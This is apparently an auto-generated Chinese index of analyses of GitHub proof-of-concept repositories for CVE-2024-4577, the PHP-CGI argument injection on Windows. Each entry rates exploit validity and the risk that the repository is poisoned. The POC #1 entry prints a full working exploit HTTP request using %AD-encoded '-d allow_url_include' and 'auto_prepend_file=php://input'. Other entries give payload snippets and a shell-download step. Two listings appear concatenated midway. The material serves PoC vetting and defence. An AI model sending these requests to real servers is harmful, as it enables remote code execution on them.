1.  **确定目标环境：**  目标服务器必须是Windows系统，并且PHP以CGI模式运行。需要确认目标服务器上PHP的版本是否在受影响的范围内（< 8.3.8, < 8.2.20, < 8.1.29）。同时确认服务器是否开启了Best-Fit代码页转换。
2.  **构造恶意URL：**  构建包含恶意PHP选项的URL。关键是使用"Best-Fit"转换可能发生的字符来代替标准PHP选项分隔符。`%AD` (软连字符)是一个常用的选择。
3.  **发送请求：**  使用POST方法向目标服务器发送包含恶意URL和PHP代码的请求。PHP代码会被`auto_prepend_file=php://input`选项包含并执行。
4.  **执行任意代码：**  成功利用后，攻击者可以在目标服务器上执行任意PHP代码或系统命令。

**缓解措施：**

*   升级PHP到不受影响的版本(>= 8.3.8, >= 8.2.20, >= 8.1.29)。
*   禁用CGI模式的PHP，如果可能的话，使用其他方式运行PHP，例如FastCGI或PHP-FPM。
*   配置Web服务器，确保不允许未授权的PHP文件执行。

**项目地址:** [ibrahmsql/CVE-2024-4577](https://github.com/ibrahmsql/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #38

**来源**: [CVE-2024-4577-l0n3m4n_CVE-2024-4577-RCE.md](../2024/CVE-2024-4577-l0n3m4n_CVE-2024-4577-RCE.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI模式)

**危害等级:** 高危，可导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** Windows系统，PHP运行于CGI模式，系统启用了使用 "Best Fit" 策略的编码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP CGI 参数注入漏洞，存在于 Windows 平台运行于 CGI 模式下的 PHP 版本中。当系统配置为使用某些代码页时，Windows 的 "Best-Fit" 行为可能会替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块错误地将这些字符解释为 PHP 选项，允许恶意用户将选项传递给 PHP 解释器，从而导致泄露源代码、执行任意 PHP 代码等。

**有效性：**
提供的PoC代码看起来有效。它通过向目标URL发送特制的请求，利用`allow_url_include`和`auto_prepend_file`这两个PHP配置项来实现远程代码执行。扫描函数检测目标是否存在漏洞，利用函数通过POST请求发送包含恶意PHP代码的文件来执行命令。

**投毒风险：**
此仓库中可能存在的投毒代码的风险较低，约为 10%。主要基于以下几点考虑：

*   **代码简洁性：** PoC 代码相对简单，易于审查，降低了隐藏恶意代码的可能性。
*   **明确的目的：** 代码的目的明确，即利用已知的漏洞，没有发现额外的、不必要的功能。
*   **作者信誉（待评估）：** 作者的信誉需要进一步验证，但从代码本身来看，没有明显的恶意行为。

尽管风险较低，仍然需要保持警惕。潜在的投毒方式可能包括：

*   **混淆代码：** 在 PHP payload 中插入难以察觉的恶意代码。
*   **依赖项：** 引入包含恶意代码的第三方库（虽然当前 PoC 没有依赖项）。

**利用方式：**
1.  攻击者首先需要确定目标系统是否满足漏洞利用的先决条件：Windows + CGI + 受影响的 PHP 版本 + 启用了 Best-Fit 编码页。
2.  攻击者构造一个包含特殊字符的 URL，该 URL 中的字符会被 Windows 的 Best-Fit 算法转换成 PHP 选项。
3.  攻击者利用 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，允许包含远程文件，并将 POST 请求的内容作为 PHP 代码执行。
4.  攻击者通过 POST 请求发送包含恶意 PHP 代码的 payload，例如执行系统命令、读取文件等。
5.  服务器执行攻击者提供的 PHP 代码，攻击者从而获得对服务器的控制权。

**项目地址:** [l0n3m4n/CVE-2024-4577-RCE](https://github.com/l0n3m4n/CVE-2024-4577-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #39

**来源**: [CVE-2024-4577-longhoangth18_CVE-2024-4577.md](../2024/CVE-2024-4577-longhoangth18_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，系统使用某些开启了"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个影响Windows系统上PHP-CGI模式的远程代码执行漏洞。当PHP在CGI模式下运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码或执行任意PHP代码。

**有效性：**
提供的POC代码有效。它通过在URL中注入恶意参数，利用`allow_url_include`和`auto_prepend_file`选项来包含和执行POST请求中提供的PHP代码。

**投毒风险：**
该POC代码本身的功能是利用漏洞进行远程代码执行。代码中添加了protocol检测，确保target可用。但仔细检查后发现，README.md文件不完整，文件末尾被截断。由于github仓库图片链接域名存在github.com，该仓库可能存在钓鱼风险，因此投毒风险预估为1%。

**利用方式：**
1.  **扫描：** 使用脚本的`-s`参数扫描目标URL是否存在漏洞。扫描器通过构造包含特定payload的URL，并发送POST请求，检测服务器返回结果中是否包含预期字符串（“Test”）。
2.  **利用：** 使用脚本的`-e`参数，配合`-p`参数指定包含PHP代码的payload文件，利用漏洞执行任意PHP代码。攻击者通过构造包含特定payload的URL，并发送包含PHP代码的POST请求。
3. 脚本通过`allow_url_include`和`auto_prepend_file`配置项的组合来包含并执行php代码。

**项目地址:** [longhoangth18/CVE-2024-4577](https://github.com/longhoangth18/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #40

**来源**: [CVE-2024-4577-mananjain61_PHP-CGI-INTERNAL-RCE.md](../2024/CVE-2024-4577-mananjain61_PHP-CGI-INTERNAL-RCE.md)

## CVE-2024-4577 PHP-CGI 参数注入导致 RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI 模式)

**危害等级:** 严重，未经身份验证的攻击者可以在受影响的服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8，并且运行在Windows的CGI模式下

**利用条件:** 需要在Windows上运行的PHP，并配置为CGI模式，且开启了使用 "Best Fit" 策略的代码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**有效性：**

从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛证实有效，且存在公开可用的PoC代码。Akamai 等安全公司已经观察到针对该漏洞的利用尝试。

提供的PoC代码通过 DNS rebinding 技术，允许攻击者绕过同源策略 (SOP)，从而访问内部网络基础设施上运行的 PHP-CGI 实例。攻击者可以通过修改`client.html`中的`payload`变量来定制要执行的 PHP 代码。

**投毒风险：**

PoC 代码主要目的是利用 DNS rebinding 攻击内部网络，并执行指定的 PHP 代码。虽然代码本身用于验证漏洞和进行渗透测试，但存在以下潜在风险：

1.  **DNS rebinding 的风险：** DNS rebinding 攻击可能导致受害者浏览器访问攻击者控制的恶意站点，从而造成信息泄露或其他安全问题。
2.  **后门代码：** 检查代码发现，代码中存在硬编码的IP地址，攻击者可以通过修改这些IP地址进行恶意活动，或者在`client.html`中插入恶意代码，诱导用户执行。
3.  **依赖第三方服务：** 代码依赖 DuckDNS，若 DuckDNS 服务被攻破，可能导致利用代码被篡改。

综合评估，代码本身存在一定的风险，但恶意投毒的可能性较低，主要风险集中在使用者对PoC代码的修改和DNS rebinding攻击本身带来的风险。因此，投毒风险评估为 10%。

**利用方式：**

1.  **配置 DuckDNS：** 攻击者需要在 DuckDNS 注册一个域名，并获取 token。
2.  **配置 PoC 代码：** 攻击者需要修改`server.py` 中的 `PUBLIC_IP`、`DUCKDNS_DOMAIN` 和 `DUCKDNS_TOKEN`，以及 `client.html` 中的 `PAYLOAD_TARGETS` 来指定要攻击的目标 IP 地址。同时，修改`client.html`中的`payload`变量，来指定要执行的php代码。
3.  **运行 server.py：** 攻击者运行 `server.py` 脚本，该脚本负责更新 DuckDNS 的 DNS 记录。
4.  **诱骗受害者访问 client.html：** 攻击者诱骗受害者（内部网络用户）使用浏览器访问 `client.html` 页面。`client.html` 会执行 DNS rebinding 攻击，将域名解析到内部网络的 IP 地址，然后向目标 PHP-CGI 服务器发送包含恶意 PHP 代码的请求。
5.  **执行任意代码：** 如果目标服务器存在 CVE-2024-4577 漏洞，恶意 PHP 代码将被执行，攻击者从而获得服务器的控制权。

**项目地址:** [mananjain61/PHP-CGI-INTERNAL-RCE](https://github.com/mananjain61/PHP-CGI-INTERNAL-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #41

**来源**: [CVE-2024-4577-mistakes1337_CVE-2024-4577.md](../2024/CVE-2024-4577-mistakes1337_CVE-2024-4577.md)

# CVE-2024-4577

> 📦 该CVE有 **53** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-4577-AlperenY-cs_CVE-2024-4577.md](../2024/CVE-2024-4577-AlperenY-cs_CVE-2024-4577.md)

## CVE-2024-4577 - PHP-CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI模式)

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统, PHP 使用 CGI 模式运行, 启用使用“Best Fit”策略的代码页, Apache 服务器

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时会受到影响。漏洞源于 Windows 在某些代码页配置下，“Best Fit” 策略可能导致命令行参数中的字符被错误转换，PHP-CGI 模块会将这些字符误解为 PHP 选项，从而允许攻击者向 PHP 传递恶意参数。 

**有效性：**
提供的 POC 代码通过 POST 请求向服务器发送包含恶意 PHP 代码的请求体，利用 `allow_url_include` 和 `auto_prepend_file` 指令来执行请求体中的 PHP 代码。如果服务器返回“vulnerable”，则表示漏洞利用成功。从漏洞原理以及多个参考链接中漏洞利用的描述，可以判断该POC代码是有效的。

**投毒风险：**
提供的漏洞利用代码主要是用于验证漏洞是否存在，本身并没有发现明显的恶意代码或后门，但是从github仓库的拉取和环境配置过程中存在一定风险。投毒风险较低，估计为 5%。

**利用方式：**
1.  **环境准备：** 搭建存在漏洞的 PHP 环境，包括：
    *   Windows 系统
    *   PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8
    *   Apache 服务器
    *   PHP 以 CGI 模式运行
    *   配置系统 Locale 为日语、简体中文或繁体中文，以启用 Best-Fit 字符转换。
2.  **发送恶意请求：**  构造包含恶意 PHP 代码的 POST 请求，利用 `allow_url_include` 和 `auto_prepend_file` 指令来执行恶意代码。例如，使用以下请求：
```
POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{HOST}}
User-Agent: curl/8.3.0
Accept: /*
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php echo \"vulnerable\"; ?>
```

3.  **远程代码执行：** 成功利用漏洞后，攻击者可以在服务器上执行任意 PHP 代码，从而控制服务器。

**参考链接：**
*   [https://nvd.nist.gov/vuln/detail/cve-2024-4577](https://nvd.nist.gov/vuln/detail/cve-2024-4577)
*   [https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure](https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure)
*   [https://www.bitsight.com/blog/cve-2024-4577-windows-encoding-gone-wrong](https://www.bitsight.com/blog/cve-2024-4577-windows-encoding-gone-wrong)
*   [https://github.com/xcanwin/CVE-2024-4577-PHP-RCE](https://github.com/xcanwin/CVE-2024-4577-PHP-RCE)

**项目地址:** [AlperenY-cs/CVE-2024-4577](https://github.com/AlperenY-cs/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #2

**来源**: [CVE-2024-4577-BTtea_CVE-2024-4577-RCE-PoC.md](../2024/CVE-2024-4577-BTtea_CVE-2024-4577-RCE-PoC.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows with CGI)

**利用条件:** PHP running in CGI mode on Windows with a codepage using "Best Fit" strategy enabled. 需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 系统上以 CGI 模式运行时出现的一个参数注入漏洞。由于 Windows 系统使用了 "Best Fit" 策略的代码页，恶意用户可以通过构造特殊字符，使得 PHP CGI 模块错误地将这些字符解析为 PHP 选项。这允许攻击者向 PHP 解释器传递恶意参数，从而执行任意 PHP 代码或者泄露源代码。

**利用方式：**

1.  **攻击向量：** 通过 HTTP 请求的 URL query string 传递恶意参数。
2.  **漏洞原理：**  Windows 的 "Best Fit" 代码页转换功能可能会将某些字符转换为其他字符，导致 PHP CGI 错误解析命令行参数。
3.  **攻击步骤：**
    *   构造包含恶意 PHP 选项的 URL，例如 `-d allow_url_include=1 -d auto_prepend_file=php://input`，允许包含远程文件。
    *   发送包含 PHP 代码的 POST 请求。
    *   利用 `php://input` 或 `data://` 等 wrapper 执行恶意代码。

**POC 代码分析：**

POC 代码 (`CVE-2024-4577.py`) 主要功能如下：

*   **Base64 编码：** 提供 Base64 编码函数，用于绕过某些过滤。
*   **服务器监听：** 包含一个简单的 TCP 服务器，可能用于接收反弹 shell（但代码中没有明确实现反弹 shell 功能）。
*   **SSL 检查：** 检查目标 URL 是否支持 SSL/TLS。
*   **WAF 检测：** 尝试绕过 Web 应用防火墙 (WAF)。 通过修改lfi参数和重新组合绕过waf。
*   **语法检查：** 通过发送包含特定 Flag 的 PHP 代码，检查目标是否容易受到Payload的影响并判断哪种方式可行。
*   **RCE 执行：** 利用 `php://input` 或 `data://` wrapper 执行任意 PHP 代码。

**投毒风险分析：**

该 POC 代码存在一定的投毒风险，约为 10%。主要风险点在于代码中的一些函数，例如服务器监听函数，可能被用于植入后门或执行其他恶意操作。虽然代码中没有明显的恶意行为，但攻击者可以修改代码以实现持久化控制或窃取敏感信息。代码中包含尝试绕过waf的操作,虽然出发点是尝试漏洞利用, 但也可能隐藏其他利用。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已经得到广泛证实，并且存在实际的利用案例。POC 代码的有效性较高，可以成功利用该漏洞在目标系统上执行任意 PHP 代码。

**总结：**

CVE-2024-4577 是一个严重的安全漏洞，攻击者可以利用该漏洞在受影响的 Windows 服务器上执行任意代码。建议尽快升级 PHP 版本，或者采取其他缓解措施。

**项目地址:** [BTtea/CVE-2024-4577-RCE-PoC](https://github.com/BTtea/CVE-2024-4577-RCE-PoC)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #3

**来源**: [CVE-2024-4577-Chocapikk_CVE-2024-4577.md](../2024/CVE-2024-4577-Chocapikk_CVE-2024-4577.md)

## CVE-2024-4577 PHP CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP-CGI模式，开启了使用"Best Fit"策略的编码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 漏洞是 PHP 在 Windows 环境下，使用 Apache 和 PHP-CGI 模式时存在的远程代码执行漏洞。当系统配置为使用某些代码页时，Windows 会使用 "Best-Fit" 策略来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**利用方式：**

1.  攻击者需要向目标服务器发送特制的HTTP请求，该请求包含畸形的 URL，URL 中包含经过特定编码的 PHP 选项，例如 `-d` 参数，用于设置 PHP 配置指令。
2.  利用 Windows 的 "Best-Fit" 字符转换特性，构造出可被 PHP-CGI 解析的参数，例如，通过替换 `-` 为 `%AD`， `=` 为 `%3D`。
3.  利用 `auto_prepend_file=php://input` 允许执行 POST 请求中的 PHP 代码。
4.  将需要执行的 PHP 代码放在 POST 请求体中，例如 `<?php system('whoami'); ?>`。
5.  目标服务器的 PHP-CGI 进程将执行攻击者提供的 PHP 代码，从而实现远程代码执行。

**有效性：**

提供的 POC 代码 `exploit.py` 尝试自动化利用此漏洞。它包含以下关键步骤：

*   **路径探测:** 尝试不同的 PHP-CGI 路径（例如 `/php-cgi/php-cgi.exe`）。
*   **参数构造:** 通过替换特殊字符来构造 PHP 配置参数，例如 `-d`。
*   **代码注入:** 使用 `auto_prepend_file` 和 `php://input` 将 PHP 代码注入到目标服务器。
*   **命令执行:**  使用 `system()` 函数执行指定的命令。

因此，提供的 POC 代码在满足漏洞利用条件的环境下是有效的。

**投毒风险：**

`exploit.py` 主要功能是扫描和利用漏洞，但也存在一定的投毒风险：

*   **依赖项风险：** `requirements.txt` 中可能存在恶意依赖项，尽管可能性较低，但仍需要注意。可以通过检查 `requirements.txt` 中列出的依赖项及其来源来降低风险。
*   **代码逻辑风险：** 即使代码表面上是无害的，也可能存在隐藏的恶意逻辑。例如，作者可能会添加收集目标信息的代码，并将这些信息发送到外部服务器。

代码中存在base64编码和解码,存在一定的风险,需要人工检查。
总体来说，该代码的投毒风险评估为10%，主要集中在依赖项和隐藏逻辑方面。需要进行代码审计以确定是否存在恶意代码。


**项目地址:** [Chocapikk/CVE-2024-4577](https://github.com/Chocapikk/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #4

**来源**: [CVE-2024-4577-CirqueiraDev_MassExploit-CVE-2024-4577.md](../2024/CVE-2024-4577-CirqueiraDev_MassExploit-CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，PHP运行在CGI模式下，开启了使用“Best Fit”策略的代码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个存在于 PHP 中的严重漏洞，当 PHP 在 Windows 上以 CGI 模式运行时，如果系统配置为使用某些代码页，则 Windows 可能会使用“Best-Fit”行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码、在服务器上运行任意 PHP 代码等。

**漏洞利用分析：**

提供的 Python 脚本 `CVE-2024-4577.py` 旨在批量检测和利用此漏洞。

1.  **有效性：** 根据漏洞描述和漏洞利用代码，该PoC利用`auto_prepend_file`和`allow_url_include`选项来包含`php://input`，从而允许攻击者注入任意 PHP 代码。如果目标环境满足漏洞利用的先决条件（Windows，CGI模式，特定版本等），则该PoC应该是有效的。搜索结果也表明该漏洞已被积极利用。
2.  **投毒风险：**  代码总体来说比较简单，主要就是发送Payload，读取返回。但是作者有添加referer头的行为，如果作者有意投毒，可以在check_exploit方法中加入恶意代码，比如，如果探测目标存在漏洞，则发送漏洞域名，以及服务器相关信息到指定服务器。或者加入一些迷惑性代码，干扰分析人员分析。基于作者添加referer头的行为, 并且根据代码量判断，投毒风险较低，判断为10%。
3.  **利用方式：**
    *   攻击者通过构造包含恶意 PHP 代码的 HTTP 请求，并利用 Windows 代码页的“Best Fit”转换特性，将特殊字符转换为 PHP 选项。
    *   这些 PHP 选项会被 PHP CGI 模块错误解析，例如，`auto_prepend_file=php://input` 允许攻击者将 HTTP 请求体的内容作为 PHP 代码执行。
    *   攻击者可以通过这种方式在服务器上执行任意 PHP 代码，从而控制服务器。

**PoC代码分析：**

*   `clean_domain(domain)`: 清理域名，移除 `http://` 或 `https://` 前缀，并提取域名部分。
*   `check_exploit(domain)`:  对目标域名发送包含 PHP 代码的 HTTP POST 请求。Payload是 `<?php phpinfo(); ?>`。
    *   使用 `auto_prepend_file=php://input` 将 POST 请求的内容（payload）作为 PHP 代码执行。
    *   检查响应中是否包含 "PHP Version" 字符串，以判断漏洞是否成功利用。
    *   如果成功，将 URL 写入 `vulnerable.txt` 文件。
*   `start(file, threads)`: 从文件中读取域名列表，并使用多线程并发地执行 `check_exploit` 函数。
*   主程序：解析命令行参数，调用 `start` 函数开始漏洞检测。

**项目地址:** [CirqueiraDev/MassExploit-CVE-2024-4577](https://github.com/CirqueiraDev/MassExploit-CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #5

**来源**: [CVE-2024-4577-Dejavu666_CVE-2024-4577.md](../2024/CVE-2024-4577-Dejavu666_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 严重，允许未经身份验证的攻击者在目标服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI mode, specific codepage settings)

**利用条件:** Windows系统，PHP运行于CGI模式，且系统配置了使用"Best Fit"策略的特定代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个影响Windows上PHP的远程代码执行漏洞，当PHP以CGI模式运行时，特定的代码页配置可能导致参数注入。Windows系统会使用“Best-Fit”策略替换命令行中的某些字符，这可能被PHP CGI模块错误地解释为PHP选项。攻击者可以通过发送特制的HTTP请求，将恶意PHP选项传递给PHP二进制文件，从而导致任意代码执行。提供的POC代码包含两个脚本：`cek.py` 用于执行命令，`cuk.py` 用于下载shell。`cek.py`通过构造包含`allow_url_include`和`auto_prepend_file`选项的请求，利用`php://input`流执行PHP代码。`cuk.py`脚本尝试从github下载一个ini.php文件到/tmp目录，存在一定的投毒风险。

**有效性评估：**
根据漏洞描述和已公开的利用信息，该漏洞利用的有效性较高，存在公开可用的POC代码，并且已经观察到在野利用。

**投毒风险评估：**
`cek.py`脚本直接执行用户指定的命令，不存在明显的投毒代码。`cuk.py`脚本从`https://github.com/Dejavu666/kng/raw/refs/heads/main/ini.php`下载文件到`/tmp/ini.php`，这意味着如果该URL指向的文件被恶意修改，攻击者可以控制目标服务器。这种行为引入了投毒风险，但需要攻击者能够控制该Github仓库中的文件。因此，投毒风险并非100%，考虑到其需要依赖于外部资源的可控性，风险评估为10%。

**利用方式：**
1.  攻击者发送包含恶意PHP选项的HTTP请求。
2.  Windows系统使用“Best-Fit”策略转换请求中的字符。
3.  PHP CGI模块错误地将转换后的字符解释为PHP选项。
4.  通过`allow_url_include`和`auto_prepend_file`选项包含并执行`php://input`流中的PHP代码，实现任意代码执行。
5. 可以使用`cek.py`执行系统命令，或者使用`cuk.py`下载恶意文件到服务器上执行。

**项目地址:** [Dejavu666/CVE-2024-4577](https://github.com/Dejavu666/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #6

**来源**: [CVE-2024-4577-Didarul342_CVE-2024-4577.md](../2024/CVE-2024-4577-Didarul342_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** PHP 8.1.x (< 8.1.29), 8.2.x (< 8.2.20), 8.3.x (< 8.3.8)，运行在Windows下的CGI模式

**利用条件:** PHP运行在Windows服务器上，使用CGI模式，并且系统启用了某些代码页，允许“Best Fit”转换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，影响在Windows上运行的PHP。当PHP以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，导致泄露源代码或执行任意PHP代码。 

**有效性:**

提供的PoC代码（CVE-2024-4577.py）尝试通过构造包含特殊字符的URL来利用此漏洞，将`allow_url_include`设置为1，并设置`auto_prepend_file`为`php://input`，然后通过POST请求发送包含要执行的PHP代码的数据。如果目标存在漏洞，这段PHP代码将被执行。

根据搜索引擎的结果和漏洞库信息，该漏洞已经存在在野利用，并且有公开可用的PoC，表明该PoC是有效的。

**投毒风险:**

查看提供的python脚本，脚本本身的功能是发送payload到目标地址，检测目标是否存在漏洞，检测的依据是返回内容中是否包含gotr00t字符串。脚本本身没有发现明显的恶意代码，但是考虑到以下情况，仍然存在一定投毒风险：

1.  **域名欺骗:**  `domains.txt` 如果被替换为包含恶意域名的文件，那么脚本会尝试连接这些恶意域名。但这不是脚本本身的投毒，而是依赖外部文件。
2.  **命令注入:**  虽然脚本本身没有直接执行系统命令，但是 `-c/--command`  参数允许用户指定要执行的PHP代码。如果用户不小心执行了恶意PHP代码，可能导致服务器受损。但这不是脚本作者的投毒，而是用户使用不当。
3.  **依赖包:**  `requirements.txt` 文件中列出了依赖包。如果这些依赖包被替换为恶意版本，可能会导致安全问题。但这通常属于供应链攻击，不是脚本作者直接投毒。

考虑到以上因素，认为脚本本身被作者投毒的可能性较低，大约在5%左右，主要风险在于使用者利用该脚本执行恶意命令或使用了被篡改的依赖包。

**利用方式:**

1.  攻击者需要找到一个运行在Windows服务器上，并且使用CGI模式的PHP应用，同时确认目标系统启用了具有“Best Fit”行为的代码页。
2.  构造包含特殊字符的恶意URL。这些特殊字符会被Windows的“Best Fit”转换机制转换为PHP选项。
3.  通过设置`allow_url_include`为1，并设置`auto_prepend_file`为`php://input`，将要执行的PHP代码通过POST请求发送到目标服务器。
4.  服务器执行恶意PHP代码，攻击者从而控制服务器。

**项目地址:** [Didarul342/CVE-2024-4577](https://github.com/Didarul342/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #7

**来源**: [CVE-2024-4577-Entropt_CVE-2024-4577_Analysis.md](../2024/CVE-2024-4577-Entropt_CVE-2024-4577_Analysis.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，系统使用特定的代码页（Best-Fit），且使用Apache服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP-CGI中的OS命令注入漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码或在服务器上运行任意PHP代码。

**有效性：**
从提供的漏洞库信息和搜索结果来看，该漏洞已被广泛利用，并且有公开的PoC代码。Akamai等机构已观察到实际利用案例。因此，认为该漏洞的PoC是有效的。

**投毒风险：**
提供的代码片段是漏洞信息的JSON格式，不包含任何可执行代码。因此，直接从这个JSON文件判断投毒风险是不可能的。需要分析具体的利用代码才能判断。考虑到Github上存在大量的POC, 假设攻击者在代码中添加了恶意代码，如反弹shell或下载执行恶意文件等，有一定的投毒可能性，估算投毒风险为10%。

**利用方式：**
利用方式主要包括以下步骤：
1.  **确定目标：** 找到运行在Windows上，且以CGI模式运行的PHP服务器，版本在受影响范围内 (PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8)。需要特别注意的是，apache服务器是必要条件之一
2.  **构造恶意请求：** 构造包含恶意PHP选项的HTTP请求。利用Windows的“Best-Fit”字符转换，将特殊字符转换为PHP选项，例如`-d`选项可以用来设置PHP配置项，`-r`选项可以直接执行PHP代码。
3.  **执行任意代码：** 通过`-d`或`-r`选项，执行任意PHP代码，例如执行`system()`函数来执行系统命令，或者写入webshell文件到服务器。

**示例：**
